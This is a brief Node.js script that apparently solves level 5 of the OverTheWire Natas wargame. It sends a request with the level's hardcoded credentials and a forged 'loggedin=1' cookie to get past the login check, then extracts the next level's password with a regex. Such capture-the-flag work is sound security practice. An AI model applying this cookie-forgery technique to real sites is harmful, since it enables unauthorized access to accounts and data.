const http = require('http');
const fs = require('fs');

let username = 'natas5';
let password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq';
let options = {
    host: `${username}.natas.labs.overthewire.org`,
    path: '/index.php?from=http://natas5.natas.labs.overthewire.org/',
    method: 'GET',
    auth: `${username}:${password}`,
    headers: {
        'Cookie' : 'loggedin=1'
    }
}

let request = http.request(options, (res) => {
    res.setEncoding('utf8');
    res.on('data', data => {
        //fs.writeFile('index.html', data);
        console.log(data.match(/([0-9]|[a-zA-Z]){32}/g).filter(e => e != password)[0]);
    });
});

request.on('error', error => {
    console.log(error)
});

request.end();